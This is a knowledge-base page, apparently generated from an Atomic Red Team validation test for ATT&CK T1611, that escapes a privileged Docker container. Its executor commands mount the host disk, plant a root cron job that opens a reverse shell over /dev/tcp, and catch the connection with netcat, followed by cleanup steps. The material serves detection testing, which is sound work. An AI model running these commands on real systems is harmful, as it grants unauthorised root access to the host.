---
atomic_guid: "6c499943-b098-4bc6-8d38-0956fc182984"
title: "Mount host filesystem to escape privileged Docker container"
framework: "atomic"
generated: "true"
attack_technique_id: "T1611"
attack_technique_name: "Escape to Host"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1611/T1611.yaml"
build_date: "2026-04-26 17:02:13"
executor: "sh"
aliases:
  - "6c499943-b098-4bc6-8d38-0956fc182984"
  - "Mount host filesystem to escape privileged Docker container"
platforms:
  - "containers"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Mount host filesystem to escape privileged Docker container

This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.
The container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.
Dev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell.

## Metadata

- Atomic GUID: 6c499943-b098-4bc6-8d38-0956fc182984
- Technique: T1611: Escape to Host
- Platforms: containers
- Executor: sh
- Elevation Required: True
- Dependency Executor: sh
- Source Path: atomics/T1611/T1611.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1611-escape_to_host|T1611]]

## Input Arguments

### cron_filename

- description: Filename of the cron job in cron_path
- type: string
- default: T1611_002

### cron_path

- description: Path on the host filesystem where cron jobs are stored
- type: path
- default: /etc/cron.d

### listen_address

- description: IP address to listen for callback from the host system.
- type: string
- default: `ifconfig eth0 | grep inet | awk '{print $2}'`

### listen_port

- description: TCP Port to listen on for callback from the host system.
- type: integer
- default: 4444

### mount_device

- description: Path to the device of the host's disk to mount
- type: path
- default: /dev/dm-0

### mount_point

- description: Path where the host filesystem will be mounted
- type: path
- default: /mnt/T1611.002

## Dependencies

Verify mount is installed.

### Prerequisite Check

```bash
which mount
```

### Get Prerequisite

```bash
if [ "" == "`which mount`" ]; then echo "mount Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install mount ; elif [ -n "`which yum`" ]; then sudo yum -y install mount ; fi ; else echo "mount installed"; fi
```

Verify container is privileged.

### Prerequisite Check

```bash
capsh --print | grep cap_sys_admin
```

### Get Prerequisite

```bash
if [ "`capsh --print | grep cap_sys_admin`" == "" ]; then echo "Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true"; fi
```

Verify mount device (/dev/dm-0) exists.

### Prerequisite Check

```bash
ls #{mount_device}
```

### Get Prerequisite

```bash
if [ ! -f #{mount_device} ]; then echo "Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true"; fi
```

Netcat is installed.

### Prerequisite Check

```bash
which netcat
```

### Get Prerequisite

```bash
if [ "" == "`which netcat`" ]; then echo "netcat Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install netcat ; elif [ -n "`which yum`" ]; then sudo yum -y install netcat ; fi
```

IP Address is known.

### Prerequisite Check

```bash
if [ "#{listen_address}" != "" ]; then echo "Listen address set as #{listen_address}" ; fi
```

### Get Prerequisite

```bash
if [ "" == "`which ifconfig`" ]; then echo "ifconfig Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install net=tools ; elif [ -n "`which yum`" ]; then sudo yum -y install net-tools ; fi
```

## Executor

- elevation_required: True
- name: sh

### Command

```bash
if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi
echo -n "* * * * * root /bin/bash -c '/bin/bash -c echo \"\"; echo \"hello from host! " > #{mount_point}#{cron_path}/#{cron_filename}
echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}
echo -n "(hostname) " >> #{mount_point}#{cron_path}/#{cron_filename}
echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}
echo "(id)\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'" >> #{mount_point}#{cron_path}/#{cron_filename}
netcat -l -p #{listen_port} 2>&1
```

### Cleanup

```bash
rm #{mount_point}#{cron_path}/#{cron_filename}
umount #{mount_point}
rmdir #{mount_point}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1611/T1611.yaml)
